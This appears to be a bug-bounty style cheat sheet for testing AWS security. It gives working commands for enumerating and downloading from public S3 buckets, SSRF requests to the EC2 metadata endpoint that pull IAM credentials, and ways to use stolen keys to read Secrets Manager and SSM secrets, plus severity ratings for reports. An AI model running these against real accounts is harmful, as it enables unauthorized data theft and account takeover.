# AWS Security Testing

> AWS misconfigurations are responsible for some of the largest data breaches in history. Every exposed credential is a potential critical finding.

---

## Recon — Finding AWS Assets

```bash
# Find S3 bucket names through passive recon
# Naming patterns: companyname-backup, company-prod, company-logs, company-assets

# Certificate Transparency search
curl -s "https://crt.sh/?q=%.s3.amazonaws.com&output=json" | jq -r '.[].name_value'

# Google dork
site:s3.amazonaws.com "company"
site:amazonaws.com inurl:company

# Passive enumeration tools
python3 cloud_enum.py -k companyname -l mutations.txt
python3 cloud_enum.py -k company-name
python3 cloud_enum.py -k companyname --disable-azure --disable-gcp

# Generate bucket name mutations manually
company-backup, company-backups, company-prod, company-dev,
company-staging, company-logs, company-assets, company-static,
company-media, company-uploads, company-data, company-db
```

---

## S3 Bucket Testing

```bash
# Check if bucket exists and is publicly accessible
aws s3 ls s3://target-bucket-name --no-sign-request

# List bucket contents
aws s3 ls s3://target-bucket-name/ --no-sign-request --recursive

# Download a file
aws s3 cp s3://target-bucket-name/sensitive-file.txt . --no-sign-request

# Check bucket ACL (if you have read permissions)
aws s3api get-bucket-acl --bucket target-bucket-name --no-sign-request

# Check bucket policy
aws s3api get-bucket-policy --bucket target-bucket-name --no-sign-request

# Try uploading (write access = critical)
echo "poc" > poc.txt
aws s3 cp poc.txt s3://target-bucket-name/poc.txt --no-sign-request

# Check for public website hosting
curl -s http://target-bucket-name.s3-website-us-east-1.amazonaws.com/
```

### What to Look For in S3 Buckets

```bash
# Find sensitive file patterns
aws s3 ls s3://bucket/ --no-sign-request --recursive | grep -iE \
  "\.env|\.pem|\.key|\.p12|id_rsa|backup|dump|\.sql|\.csv|\.log|config|secret|password|credential"

# Download and search
aws s3 sync s3://bucket/ ./bucket_data/ --no-sign-request
grep -r "password\|secret\|token\|key\|credential" ./bucket_data/ -i
```

---

## SSRF → AWS Metadata (EC2 IMDSv1)

```bash
# If SSRF is found on an EC2-hosted application:

# Instance metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-ipv4
http://169.254.169.254/latest/meta-data/iam/info

# IAM credentials (the jackpot)
http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Response: role-name
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
# Response: AccessKeyId, SecretAccessKey, Token, Expiration

# User data (often contains secrets / bootstrap scripts)
http://169.254.169.254/latest/user-data/

# IMDSv2 (requires token — harder to abuse)
# Step 1: Get token
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
# Step 2: Use token
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

## Using Stolen AWS Credentials

```bash
# Configure stolen credentials
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."    # Only if temporary credentials

# Check who you are
aws sts get-caller-identity

# Enumerate accessible services
aws iam get-user
aws iam list-attached-user-policies --user-name USERNAME
aws iam list-user-policies --user-name USERNAME

# List S3 buckets
aws s3 ls

# List EC2 instances
aws ec2 describe-instances --region us-east-1

# List Lambda functions
aws lambda list-functions --region us-east-1

# List RDS databases
aws rds describe-db-instances --region us-east-1

# Secrets Manager
aws secretsmanager list-secrets --region us-east-1
aws secretsmanager get-secret-value --secret-id SECRET-NAME

# SSM Parameter Store (often contains credentials)
aws ssm describe-parameters --region us-east-1
aws ssm get-parameter --name /prod/db/password --with-decryption

# CloudFormation (may contain secrets in templates)
aws cloudformation describe-stacks --region us-east-1
```

---

## Common AWS Misconfigurations

**Publicly readable S3 bucket**
Check: `aws s3 ls s3://bucket --no-sign-request`
Impact: Sensitive data exposure

**S3 bucket with public write access**
Check: Try uploading a test file `--no-sign-request`
Impact: Content injection, malware hosting, data tampering

**EC2 IMDSv1 enabled with SSRF**
Check: Access metadata endpoint via SSRF
Impact: IAM credential theft → full account takeover

**Overly permissive IAM role**
Check: After credential theft, run `aws iam get-user` and enumerate policies
Impact: Lateral movement, privilege escalation within AWS account

**Publicly accessible RDS/ElasticSearch**
Check: Shodan `port:9200 org:"Amazon"` or `port:3306 org:"Amazon"`
Impact: Direct database access without authentication

**Lambda function with environment variable secrets**
Check: `aws lambda get-function-configuration --function-name NAME`
Impact: Plaintext credentials in serverless functions

**Exposed ECR (container registry)**
Check: `aws ecr describe-repositories`
Impact: Pull container images, find secrets in layers

---

## S3Scanner (Automated)

```bash
# Install
pip3 install s3scanner

# Scan a single bucket
s3scanner scan --bucket target-bucket-name

# Scan from file
s3scanner scan --bucket-file buckets.txt

# Check specific region
s3scanner scan --bucket target-bucket-name --region eu-west-1
```

---

## Reporting AWS Findings

**S3 public read (non-sensitive data)** → Medium
**S3 public read (credentials/PII/source code)** → Critical
**S3 public write** → High
**EC2 metadata SSRF → IAM credentials** → Critical
**Exposed Secrets Manager / SSM secrets** → Critical
**Overpermissive role (full admin)** → Critical
